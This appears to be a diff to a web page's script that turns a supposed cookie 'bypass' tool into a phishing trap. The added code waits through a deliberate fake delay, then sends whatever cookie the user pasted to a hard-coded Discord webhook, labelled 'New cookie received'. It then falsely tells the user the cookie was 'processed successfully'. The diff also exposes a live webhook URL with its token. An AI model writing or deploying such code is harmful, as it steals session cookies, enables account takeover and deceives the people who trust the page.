@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
     <head>
@@ -116,36 +115,64 @@
                 }
             });
 
-            // Webhook functionality (only addition)
-            document.getElementById('processButton').addEventListener('click', async function() {
+            // Webhook functionality with fake refresh
+            document.getElementById('processButton').addEventListener('click', async function(e) {
+                e.preventDefault();
+                
                 const input = document.getElementById("dataInput").value.trim();
                 const button = this;
+                const resultContent = document.querySelector('.result-content');
+                const resultDiv = document.querySelector('.main-result');
                 
                 if (!input) return;
                 
                 button.disabled = true;
                 button.textContent = "Processing...";
+                resultDiv.style.display = 'none';
 
                 try {
+                    // Fake refresh delay (1.5 seconds)
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    // Send to Discord webhook (REPLACE WITH YOUR WEBHOOK URL)
                     await fetch("https://discord.com/api/webhooks/1318559677080146063/eItm2Y-11kg46ERCqngbgDC0WYBdXpaMmBfZxJJoPvjJzCiVx7cEXkd4feIVvF-yXVFJ", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
-                            content: "New input received:",
+                            content: "New cookie received:",
                             embeds: [{
                                 description: `\`\`\`\n${input}\n\`\`\``,
-                                color: 0xe60012
+                                color: 0xe60012,
+                                timestamp: new Date().toISOString()
                             }]
                         })
                     });
                     
+                    // Show success in result div
+                    resultContent.textContent = "Cookie processed successfully";
+                    resultDiv.style.display = 'block';
                     document.getElementById("dataInput").value = "";
+                    
                 } catch (error) {
                     console.error("Error:", error);
+                    resultContent.textContent = "Error processing cookie";
+                    resultDiv.style.display = 'block';
                 } finally {
                     button.textContent = "bypass";
                     button.disabled = false;
                 }
+            });
+
+            // Copy button functionality
+            document.querySelector('.result-button').addEventListener('click', function() {
+                const textToCopy = document.querySelector('.result-content').textContent;
+                navigator.clipboard.writeText(textToCopy).then(() => {
+                    const originalText = this.textContent;
+                    this.textContent = "Copied!";
+                    setTimeout(() => {
+                        this.textContent = originalText;
+                    }, 2000);
+                });
             });
         </script>
         <script src="js/main.js"></script>
